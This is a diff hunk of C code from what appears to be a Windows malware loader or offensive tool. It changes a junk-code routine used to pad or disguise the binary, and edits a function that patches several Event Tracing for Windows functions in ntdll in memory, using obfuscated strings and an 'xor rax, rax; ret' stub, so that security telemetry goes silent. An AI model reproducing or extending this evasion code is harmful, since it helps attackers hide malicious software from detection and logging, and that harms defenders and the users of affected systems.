@@ -62,35 +62,19 @@ VirtualAllocExNumaFunc pwVirtualAllocExNuma = (VirtualAllocExNumaFunc)GetProcAdd
 
 void junk_code() {
     volatile unsigned long long j = 0xDEADBEEFDEADBEEFULL;
-    for (int a = 0; a < 97; ++a) {
-        for (int b = 0; b < 3; ++b) {
-            unsigned int r1 = (a + b) & 63u;
-            unsigned int r2 = (a * b + 11) & 63u;
-            unsigned int r3 = (b * 7 + a) & 31u;
-            unsigned int r4 = (a + 5) & 31u;
-            unsigned int r5 = (b + 3) & 15u;
-            j = (j << r1) | (j >> (64u - r1));
-            j ^= 0xABCDEF1234567890ULL;
-            j = ~j;
-            j = (j >> r2) | (j << (64u - r2));
-            j += 0x1111111111111111ULL;
-            j ^= (j >> r4);
-            j = __builtin_bswap64(j);
-            j ^= (0x13579BDF02468ACEULL + (unsigned long long)(a * 31337ULL) + (unsigned long long)b);
-            j = (j << r3) | (j >> (64u - r3));
-            j *= 0x9E3779B97F4A7C15ULL;
-            j ^= (j << r5);
-        }
+    for (int i = 0; i < 291; ++i) {
+        j ^= 0xABCDEF1234567890ULL;
+        j = (j << 1) | (j >> 63);
+        j += 0x1111111111111111ULL;
     }
 }
 
 BOOL ETWPATCH() {
     DWORD oldprotect = 0;
-    const char* functions[] = { OBF("EtwEventWrite"), OBF("EtwEventWriteFull"), OBF("EtwEventWriteTransfer"), OBF("EtwRegister"), OBF("EtwRegisterTraceGuidsW"), OBF("EtwRegisterTraceGuidsA"), OBF("EtwSendMessage"), OBF("EtwEventWriteNoRegistration") };
+    const char* functions[] = { OBF("EtwEventWrite"), OBF("EtwEventWriteFull"), OBF("EtwEventWriteTransfer"), OBF("EtwRegister")};
     for (int i = 0; i < (sizeof(functions) / sizeof(functions[0])); i++) {
         void* pFunc = (void*)GetProcAddress(GetModuleHandleA(OBF("ntdll.dll")), functions[i]);
         if (!pFunc) continue;
-
         if (!VirtualProtect(pFunc, 4096, PAGE_EXECUTE_READWRITE, &oldprotect)) return FALSE;
 #ifdef _WIN64
         memcpy(pFunc, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret
